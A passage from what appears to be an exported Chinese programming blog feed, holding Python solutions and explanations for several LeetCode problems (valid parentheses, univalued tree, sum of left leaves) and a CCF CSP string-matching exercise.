class="keyword">else</span>:  <span class="comment"># "(A)" "AB" 的情况</span></div><div class="line">                    stack.append(<span class="number">2</span> * score)</div><div class="line">        <span class="keyword">return</span> sum(stack)</div></pre></td></tr></table></figure>
<ul>
<li><strong>题解 2</strong></li>
</ul>
<p>　　依然是栈的思想，但没有用到栈。给定一个标记 flag，若 ‘（’ 则 flag 左移，若 ‘）’ 则 flag 右移，若遇到 () 则 将 flag 的值记录到结果中去。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">scoreOfParentheses</span><span class="params">(self, S)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type S: str</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        score = <span class="number">0</span></div><div class="line">        flag = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(S)):</div><div class="line">            <span class="keyword">if</span> S[i] == <span class="string">'('</span>:</div><div class="line">                <span class="keyword">if</span> flag == <span class="number">0</span>:  <span class="comment"># "()"的情况</span></div><div class="line">                    flag = <span class="number">1</span></div><div class="line">                <span class="keyword">else</span>:  <span class="comment"># "(A)" "AB" 的情况</span></div><div class="line">                    flag = flag &lt;&lt; <span class="number">1</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">if</span> S[i - <span class="number">1</span>] == <span class="string">'('</span>:</div><div class="line">                    score += flag  <span class="comment"># 记录到结果中</span></div><div class="line">                flag = flag &gt;&gt; <span class="number">1</span></div><div class="line">        <span class="keyword">return</span> score</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>Stack</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode 20. Valid Parentheses</title>
    <url>/2019/02/02/LeetCode-20-Valid-Parentheses/</url>
    <content><![CDATA[<center>LeetCode 20. Valid Parentheses 题解</center>

<a id="more"></a>
<h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><ul>
<li><strong>英文：</strong></li>
</ul>
<p>Given a string containing just the characters <code>&#39;(&#39;</code>, <code>&#39;)&#39;</code>, <code>&#39;{&#39;</code>, <code>&#39;}&#39;</code>, <code>&#39;[&#39;</code> and <code>&#39;]&#39;</code>, determine if the input string is valid.</p>
<p>An input string is valid if:</p>
<ol>
<li>Open brackets must be closed by the same type of brackets.</li>
<li>Open brackets must be closed in the correct order.</li>
</ol>
<p>Note that an empty string is also considered valid.</p>
<ul>
<li><strong>中文：</strong> </li>
</ul>
<p>给定一个只包括 <code>&#39;(&#39;</code>，<code>&#39;)&#39;</code>，<code>&#39;{&#39;</code>，<code>&#39;}&#39;</code>，<code>&#39;[&#39;</code>，<code>&#39;]&#39;</code> 的字符串，判断字符串是否有效。</p>
<p>有效字符串需满足：</p>
<ol>
<li>左括号必须用相同类型的右括号闭合。</li>
<li>左括号必须以正确的顺序闭合。</li>
</ol>
<p>注意空字符串可被认为是有效字符串。</p>
<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><ul>
<li><strong>示例 1:</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入: &quot;()&quot;</div><div class="line">输出: true</div></pre></td></tr></table></figure>
<ul>
<li><strong>示例 2:</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入: &quot;()[]&#123;&#125;&quot;</div><div class="line">输出: true</div></pre></td></tr></table></figure>
<ul>
<li><strong>示例 3:</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入: &quot;(]&quot;</div><div class="line">输出: false</div></pre></td></tr></table></figure>
<ul>
<li><strong>示例 4:</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入: &quot;([)]&quot;</div><div class="line">输出: false</div></pre></td></tr></table></figure>
<ul>
<li><strong>示例 5:</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入: &quot;&#123;[]&#125;&quot;</div><div class="line">输出: true</div></pre></td></tr></table></figure>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><ul>
<li><strong>题解 1</strong></li>
</ul>
<p>　　使用栈来实现，检查字符串序列，如果遇到左半边括号，则入栈，如果遇到右半边括号，且栈不为空，则出栈，如果最后栈为空，则表示字符串有效。另外，需考虑特殊情况，即只有右半边括号的情况，这时采用标志位标识这种情况，一旦出现这种情况，字符串无效。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isValid</span><span class="params">(self, s)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type s: str</div><div class="line">        :rtype: bool</div><div class="line">        """</div><div class="line">        stack = []</div><div class="line">        flag = <span class="number">1</span></div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</div><div class="line">            <span class="keyword">if</span> i == <span class="string">'('</span> <span class="keyword">or</span> i == <span class="string">'&#123;'</span> <span class="keyword">or</span> i == <span class="string">'['</span>:  <span class="comment"># 左半边括号入栈</span></div><div class="line">                stack.append(i)</div><div class="line">            <span class="keyword">elif</span> stack <span class="keyword">and</span> ((i == <span class="string">')'</span> <span class="keyword">and</span> stack[<span class="number">-1</span>] == <span class="string">"("</span>) <span class="keyword">or</span> (i == <span class="string">'&#125;'</span> <span class="keyword">and</span> stack[<span class="number">-1</span>] == <span class="string">"&#123;"</span>) <span class="keyword">or</span> (</div><div class="line">                    i == <span class="string">']'</span> <span class="keyword">and</span> stack[<span class="number">-1</span>] == <span class="string">"["</span>)):  <span class="comment"># 遇到右半边括号，且栈不为空</span></div><div class="line">                stack.pop()</div><div class="line">            <span class="keyword">else</span>:  <span class="comment"># 标识只有右半边括号的情况</span></div><div class="line">                flag = <span class="number">0</span></div><div class="line">        <span class="keyword">if</span> flag == <span class="number">0</span> <span class="keyword">or</span> stack:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">True</span></div></pre></td></tr></table></figure>
<ul>
<li><strong>题解 2</strong></li>
</ul>
<p>　　使用字典存储括号对，依然时左半边括号入栈，遇到右半边括号时，检查栈是否为空，如果为空则表示出现只有右半边括号的七情况，返回 False；如果右半边括号不等于栈顶元素，即括号不对称相等，也返回 False；如果最后栈为空，则表示字符串有效，返回 True，否则，返回 False。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isValid</span><span class="params">(self, s)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type s: str</div><div class="line">        :rtype: bool</div><div class="line">        """</div><div class="line">        <span class="keyword">if</span> len(s) % <span class="number">2</span> != <span class="number">0</span>:  <span class="comment"># 过滤括号数量不是偶数的情况</span></div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">        lb = &#123;<span class="string">'('</span>: <span class="string">')'</span>, <span class="string">'['</span>: <span class="string">']'</span>, <span class="string">'&#123;'</span>: <span class="string">'&#125;'</span>&#125;  <span class="comment"># 括号对</span></div><div class="line">        stack = []</div><div class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> s:</div><div class="line">            <span class="keyword">if</span> x <span class="keyword">in</span> lb:  <span class="comment"># 左半边括号入栈</span></div><div class="line">                stack.append(x)</div><div class="line">            <span class="keyword">else</span>:  <span class="comment"># 右半边括号</span></div><div class="line">                <span class="keyword">if</span> len(stack) == <span class="number">0</span>:  <span class="comment"># 栈内没有左半边括号，字符串无效</span></div><div class="line">                    <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">                top = stack.pop()</div><div class="line">                <span class="keyword">if</span> lb[top] != x:  <span class="comment"># 括号不对称相等</span></div><div class="line">                    <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">        <span class="keyword">return</span> len(stack) == <span class="number">0</span>  <span class="comment"># 栈为空时则表示字符串有效</span></div></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>Stack</tag>
      </tags>
  </entry>
  <entry>
    <title>CCF CSP 字符串匹配</title>
    <url>/2019/02/01/CCF-CSP-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D/</url>
    <content><![CDATA[<center>201409-3 字符串匹配 题解</center>

<a id="more"></a>
<h4 id="201409-3-字符串匹配"><a href="#201409-3-字符串匹配" class="headerlink" title="201409-3 字符串匹配"></a>201409-3 字符串匹配</h4><h5 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">试题编号：201409-3</div><div class="line">试题名称：字符串匹配</div><div class="line">时间限制：1.0s</div><div class="line">内存限制：256.0MB</div><div class="line"></div><div class="line">问题描述</div><div class="line">　　给出一个字符串和多行文字，在这些文字中找到字符串出现的那些行。你的程序还需支持大小写敏感选项：当选项打开时，表示同一个字母的大写和小写看作不同的字符；当选项关闭时，表示同一个字母的大写和小写看作相同的字符。</div><div class="line">　　</div><div class="line">输入格式</div><div class="line">　　输入的第一行包含一个字符串S，由大小写英文字母组成。</div><div class="line">　　第二行包含一个数字，表示大小写敏感的选项，当数字为0时表示大小写不敏感，当数字为1时表示大小写敏感。</div><div class="line">　　第三行包含一个整数n，表示给出的文字的行数。</div><div class="line">　　接下来n行，每行包含一个字符串，字符串由大小写英文字母组成，不含空格和其他字符。</div><div class="line">　　</div><div class="line">输出格式</div><div class="line">　　输出多行，每行包含一个字符串，按出现的顺序依次给出那些包含了字符串S的行。</div><div class="line">　　</div><div class="line">样例输入</div><div class="line">Hello</div><div class="line">1</div><div class="line">5</div><div class="line">HelloWorld</div><div class="line">HiHiHelloHiHi</div><div class="line">GrepIsAGreatTool</div><div class="line">HELLO</div><div class="line">HELLOisNOTHello</div><div class="line"></div><div class="line">样例输出</div><div class="line">HelloWorld</div><div class="line">HiHiHelloHiHi</div><div class="line">HELLOisNOTHello</div><div class="line"></div><div class="line">样例说明</div><div class="line">　　在上面的样例中，第四个字符串虽然也是Hello，但是大小写不正确。如果将输入的第二行改为0，则第四个字符串应该输出。</div><div class="line">　　</div><div class="line">评测用例规模与约定</div><div class="line">　　1&lt;=n&lt;=100，每个字符串的长度不超过100。</div></pre></td></tr></table></figure>
<h4 id="题解-1"><a href="#题解-1" class="headerlink" title="题解 1"></a>题解 1</h4><p>　　可以使用成员操作符 <code>in</code> 来判断，但是，这里要考虑大小写是否敏感的问题，特别是大小写不敏感时，我们将字符串全部转换成大写，再使用 <code>in</code> 来进行判断。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">target = input()  <span class="comment"># 子串</span></div><div class="line">flag = int(input())  <span class="comment"># 大小写敏感标识</span></div><div class="line">nums = int(input())  <span class="comment"># 输入源字符串个数</span></div><div class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(nums):</div><div class="line">    source = input()  <span class="comment"># 源字符串</span></div><div class="line">    <span class="keyword">if</span> flag == <span class="number">0</span>:  <span class="comment"># 大小写不敏感</span></div><div class="line">        <span class="keyword">if</span> str.upper(target) <span class="keyword">in</span> str.upper(source):</div><div class="line">            print(source)</div><div class="line">    <span class="keyword">else</span>:  <span class="comment"># 大小写敏感</span></div><div class="line">        <span class="keyword">if</span> target <span class="keyword">in</span> source:</div><div class="line">            print(source)</div></pre></td></tr></table></figure>
<h4 id="题解-2"><a href="#题解-2" class="headerlink" title="题解 2"></a>题解 2</h4><p>　　使用 Python 字符串的 <code>find()</code> 方法来检测字符串中是否包含某个子串。同上，使用大小写转换的方式来处理大小写不敏感的情况。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">target = input()  <span class="comment"># 子串</span></div><div class="line">flag = int(input())  <span class="comment"># 大小写敏感标识</span></div><div class="line">nums = int(input())  <span class="comment"># 输入源字符串个数</span></div><div class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(nums):</div><div class="line">    source = input()</div><div class="line">    <span class="keyword">if</span> flag == <span class="number">0</span>:  <span class="comment"># 大小写不敏感</span></div><div class="line">        target = str.upper(target)</div><div class="line">        source = str.upper(source)</div><div class="line">    <span class="keyword">if</span> source.find(target) != <span class="number">-1</span>:  <span class="comment"># 查找子串</span></div><div class="line">        print(source)</div></pre></td></tr></table></figure>
<h4 id="题解-3"><a href="#题解-3" class="headerlink" title="题解 3"></a>题解 3</h4><p>　　使用最原始的方法，从源字符串的第一个字符开始，依次与目标字符串，即子串进行比较，若子串的所有字符都与字符串的某一段连续字符相等则目标字符串为源字符串的子串，直接输出。同时，考虑大小写敏感的问题。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line">target = input()  <span class="comment"># 子串</span></div><div class="line">flag = int(input())  <span class="comment"># 大小写敏感标识</span></div><div class="line">nums = int(input())  <span class="comment"># 输入源字符串个数</span></div><div class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(nums):</div><div class="line">    source = input()</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(source)):</div><div class="line">        j = i</div><div class="line">        k = <span class="number">0</span></div><div class="line">        <span class="keyword">if</span> flag == <span class="number">0</span>:  <span class="comment"># 大小写不敏感</span></div><div class="line">            <span class="keyword">while</span> j &lt; len(source) <span class="keyword">and</span> k &lt; len(target) <span class="keyword">and</span> str.upper(source[j]) == str.upper(target[k]):  <span class="comment"># 比较每个字符</span></div><div class="line">                j += <span class="number">1</span></div><div class="line">                k += <span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:  <span class="comment"># 大小写敏感</span></div><div class="line">            <span class="keyword">while</span> j &lt; len(source) <span class="keyword">and</span> k &lt; len(target) <span class="keyword">and</span> source[j] == target[k]:</div><div class="line">                j += <span class="number">1</span></div><div class="line">                k += <span class="number">1</span></div><div class="line"></div><div class="line">        <span class="keyword">if</span> k == len(target):  <span class="comment"># 如果所有字符都相等</span></div><div class="line">            print(source)</div><div class="line">            <span class="keyword">break</span></div></pre></td></tr></table></figure>
<h4 id="判断子串总结"><a href="#判断子串总结" class="headerlink" title="判断子串总结"></a>判断子串总结</h4><h5 id="in-方法"><a href="#in-方法" class="headerlink" title="in 方法"></a>in 方法</h5><p>　　使用成员操作符 <code>in</code> ：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">"Hello world"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">"llo"</span> <span class="keyword">in</span> s</div><div class="line"><span class="keyword">True</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">"lll"</span> <span class="keyword">in</span> s</div><div class="line"><span class="keyword">False</span></div></pre></td></tr></table></figure>
<h5 id="字符串对象方法"><a href="#字符串对象方法" class="headerlink" title="字符串对象方法"></a>字符串对象方法</h5><ul>
<li><strong>find 和 rfind 方法</strong></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">"Hello world"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s.find(<span class="string">"llo"</span>) <span class="comment"># 返回子串的索引</span></div><div class="line"><span class="number">2</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s.find(<span class="string">"lll"</span>) <span class="comment"># 找不到子字符串的时候会返回 -1</span></div><div class="line"><span class="number">-1</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s.rfind(<span class="string">"llo"</span>)</div><div class="line"><span class="number">2</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s.rfind(<span class="string">"lll"</span>)</div><div class="line"><span class="number">-1</span></div></pre></td></tr></table></figure>
<ul>
<li><strong>index 和 rindex 方法</strong></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">"Hello world"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s.index(<span class="string">"llo"</span>) <span class="comment"># 返回子串的索引</span></div><div class="line"><span class="number">2</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s.index(<span class="string">"lll"</span>) <span class="comment"># 找不到子字符串的时候会报一个ValueError异常</span></div><div class="line">Traceback (most recent call last):</div><div class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</div><div class="line">ValueError: substring <span class="keyword">not</span> found</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s.rindex(<span class="string">"llo"</span>)</div><div class="line"><span class="number">2</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s.rindex(<span class="string">"lll"</span>)</div><div class="line">Traceback (most recent call last):</div><div class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</div><div class="line">ValueError: substring <span class="keyword">not</span> found</div></pre></td></tr></table></figure>
<ul>
<li><strong>count 方法</strong></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">"Hello world"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s.count(<span class="string">"llo"</span>) <span class="comment"># 返回子串出现次数</span></div><div class="line"><span class="number">1</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>s.count(<span class="string">"lll"</span>) <span class="comment"># 不是子串</span></div><div class="line"><span class="number">0</span></div></pre></td></tr></table></figure>
<h5 id="str-模块方法"><a href="#str-模块方法" class="headerlink" title="str 模块方法"></a>str 模块方法</h5><ul>
<li><strong>find 和 rfind 方法</strong></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">"Hello world"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>str.find(s, <span class="string">"llo"</span>) <span class="comment"># 返回子串的索引</span></div><div class="line"><span class="number">2</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>str.find(s, <span class="string">"lll"</span>) <span class="comment"># 找不到子字符串的时候会返回 -1</span></div><div class="line"><span class="number">-1</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>str.rfind(s, <span class="string">"llo"</span>)</div><div class="line"><span class="number">2</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>str.rfind(s, <span class="string">"lll"</span>)</div><div class="line"><span class="number">-1</span></div></pre></td></tr></table></figure>
<ul>
<li><strong>index 和 rindex 方法</strong></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">"Hello world"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>str.index(s, <span class="string">"llo"</span>) <span class="comment"># 返回子串的索引</span></div><div class="line"><span class="number">2</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>str.index(s, <span class="string">"lll"</span>) <span class="comment"># 找不到子字符串的时候会报一个ValueError异常</span></div><div class="line">Traceback (most recent call last):</div><div class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</div><div class="line">ValueError: substring <span class="keyword">not</span> found</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>str.rindex(s, <span class="string">"llo"</span>)</div><div class="line"><span class="number">2</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>str.rindex(s, <span class="string">"lll"</span>)</div><div class="line">Traceback (most recent call last):</div><div class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</div><div class="line">ValueError: substring <span class="keyword">not</span> found</div></pre></td></tr></table></figure>
<ul>
<li><strong>count 方法</strong></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="string">"Hello world"</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>str.count(s, <span class="string">"llo"</span>) <span class="comment"># 返回子串出现次数</span></div><div class="line"><span class="number">1</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>str.count(s, <span class="string">"lll"</span>) <span class="comment"># 不是子串</span></div><div class="line"><span class="number">0</span></div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>CCF-CSP</category>
      </categories>
      <tags>
        <tag>CCF-CSP</tag>
        <tag>教女朋友学Python</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode 965. Univalued Binary Tree</title>
    <url>/2019/01/29/LeetCode-965-Univalued-Binary-Tree/</url>
    <content><![CDATA[<center>LeetCode 965. Univalued Binary Tree 题解</center>

<a id="more"></a>
<h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><ul>
<li><strong>英文：</strong> </li>
</ul>
<p>A binary tree is <em>univalued</em> if every node in the tree has the same value.</p>
<p>Return <code>true</code> if and only if the given tree is univalued.</p>
<ul>
<li><strong>中文：</strong> </li>
</ul>
<p>如果二叉树每个节点都具有相同的值，那么该二叉树就是<em>单值</em>二叉树。</p>
<p>只有给定的树是单值二叉树时，才返回 <code>true</code>；否则返回 <code>false</code>。</p>
<p><strong>提示：</strong></p>
<ol>
<li>给定树的节点数范围是 <code>[1, 100]</code>。</li>
<li>每个节点的值都是整数，范围为 <code>[0, 99]</code> 。</li>
</ol>
<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><ul>
<li><strong>示例 1：</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">     1</div><div class="line">   /   \</div><div class="line">  1     1</div><div class="line"> / \     \</div><div class="line">1   1     1</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入：[1,1,1,1,1,null,1]</div><div class="line">输出：true</div></pre></td></tr></table></figure>
<ul>
<li><strong>示例 2：</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">     2</div><div class="line">   /   \</div><div class="line">  2     2</div><div class="line"> / \ </div><div class="line">5   2</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入：[2,2,2,5,2]</div><div class="line">输出：false</div></pre></td></tr></table></figure>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><ul>
<li><strong>题解 1</strong></li>
</ul>
<p>　　非递归解法。用一个队列记录未检查的节点，然后依次检查每个节点，判断节点的值是否与根节点的值相等，如果是，则检查是否有左右子节点，如果有则将其加入到队列，以待后续检查。然后，判断下一个节点。否则，返回False。直到所有节点都被检查完，再返回True。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># Definition for a binary tree node.</span></div><div class="line"><span class="comment"># class TreeNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.left = None</span></div><div class="line"><span class="comment">#         self.right = None</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isUnivalTree</span><span class="params">(self, root)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type root: TreeNode</div><div class="line">        :rtype: bool</div><div class="line">        """</div><div class="line">        q = [root]</div><div class="line">        flag = root.val	<span class="comment"># 单值</span></div><div class="line">        <span class="keyword">while</span> len(q) &gt; <span class="number">0</span>:</div><div class="line">            node = q[<span class="number">0</span>]</div><div class="line">            <span class="keyword">if</span> node.val != flag:	<span class="comment"># 一旦有一个不相同即不是单值二叉树树</span></div><div class="line">                <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">            <span class="keyword">if</span> node.left:</div><div class="line">                q.append(node.left)	<span class="comment"># 左子节点加入队列，待检查</span></div><div class="line">            <span class="keyword">if</span> node.right:</div><div class="line">                q.append(node.right)	<span class="comment"># 右子节点加入队列，待检查</span></div><div class="line">            <span class="keyword">del</span> q[<span class="number">0</span>]</div><div class="line">        <span class="keyword">return</span> <span class="keyword">True</span></div></pre></td></tr></table></figure>
<ul>
<li><strong>题解 2</strong></li>
</ul>
<p>　　递归解法。依次检查每个节点，判断节点是否为空，左子节点和父节点是否相同，右子节点和父节点是否相同，左子节点和右子节点是否相同。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># Definition for a binary tree node.</span></div><div class="line"><span class="comment"># class TreeNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.left = None</span></div><div class="line"><span class="comment">#         self.right = None</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isUnivalTree</span><span class="params">(self, root)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type root: TreeNode</div><div class="line">        :rtype: bool</div><div class="line">        """</div><div class="line">        left = (root.left <span class="keyword">is</span> <span class="keyword">None</span>) <span class="keyword">or</span> (root.val == root.left.val <span class="keyword">and</span> self.isUnivalTree(root.left))</div><div class="line">        right = (root.right <span class="keyword">is</span> <span class="keyword">None</span>) <span class="keyword">or</span> (root.val == root.right.val <span class="keyword">and</span> self.isUnivalTree(root.right))</div><div class="line">        <span class="keyword">return</span> left <span class="keyword">and</span> right</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>Tree</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode 404. Sum of Left Leaves</title>
    <url>/2019/01/29/LeetCode-404-Sum-of-Left-Leaves/</url>
    <content><![CDATA[<center>LeetCode 404. Sum of Left Leaves 题解</center>

<a id="more"></a>
<h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><ul>
<li><strong>英文：</strong> </li>
</ul>
<p>Find the sum of all left leaves in a given binary tree.</p>
<ul>
<li><strong>中文：</strong> </li>
</ul>
<p>计算给定二叉树的所有左叶子之和。</p>
<h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">    3</div><div class="line">   / \</div><div class="line">  9  20</div><div class="line">    /  \</div><div class="line">   15   7</div><div class="line"></div><div class="line">在这个二叉树中，有两个左叶子，分别是 9 和 15，所以返回 24</div></pre></td></tr></table></figure>
<h5 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h5><ul>
<li><strong>题解 1</strong></li>
</ul>
<p>　　非递归解法。用一个队列记录未检查的节点，然后从根节点开始，依次检查每个节点的左子节点和右子节点；检查左子节点时，需判断其是不是叶子节点，如果是，则将其加入到结果中，否则，加入到队列中以待后续检查；检查右子节点时，如果不为空则将其左右子节点加入到队列，待后续检查，否则，不做处理。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># Definition for a binary tree node.</span></div><div class="line"><span class="comment"># class TreeNode:</span></div><div class="line"><span class="comment">#     def __init__(self, x):</span></div><div class="line"><span class="comment">#         self.val = x</span></div><div class="line"><span class="comment">#         self.left = None</span></div><div class="line"><span class="comment">#         self.right = None</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sumOfLeftLeaves</span><span class="params">(self, root)</span>:</span></div><div class="line">        <span class="string">"""</span></div><div class="line">        :type root: TreeNode</div><div class="line">        :rtype: int</div><div class="line">        """</div><div class="line">        res = <span class="number">0</span></div><div class="line">        <span class="keyword">if</span> root <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> res</div><div class="line">        q = [root]  <span class="comment"># 存储待检查节点</span></div><div class="line">        <span class="keyword">while</span> len(q) &gt; <span class="number">0</span>:</div><div class="line">            node = q[<span class="number">0</span>]  <span class="comment"># 检查队头节点</span></div><div class="line">            <span class="keyword">if</span> node.left:</div><div class="line">                <span class="keyword">if</span> node.left.left <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">and</span> node.left.right <span class="keyword">is</span> <span class="keyword">None</span>:  <span class="comment"># 判断是否是叶子节点</span></div><div class="line">                    res += node.left.val  <span class="comment"># 记录到结果中</span></div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    q.append(node.left)  <span class="comment"># 加入队列，用于后续检查</span></div><div class="line">            <span class="keyword">if</span> node.right:</div><div class="line">                q.append(node.right)  <span class="comment"># 加入队列，用于后续检查</span></div><div class="line">            <span class="keyword">del</span> q[<span class="number">0</span>]  <span class="comment"># 删除检查完的节点</span></div><div class="line">        <span class="keyword">return</span> res</div></pre></td></tr></table></figure>
<ul>
<li><strong>题解 2</strong></li>
</ul>
<p>　　递归解法。从根节点开始检查每个节点，每次判断左节点是否存在，并且左子节点为叶子节点，则将其值记录到结果中，否则，再依次检查其左右子节点。</p>
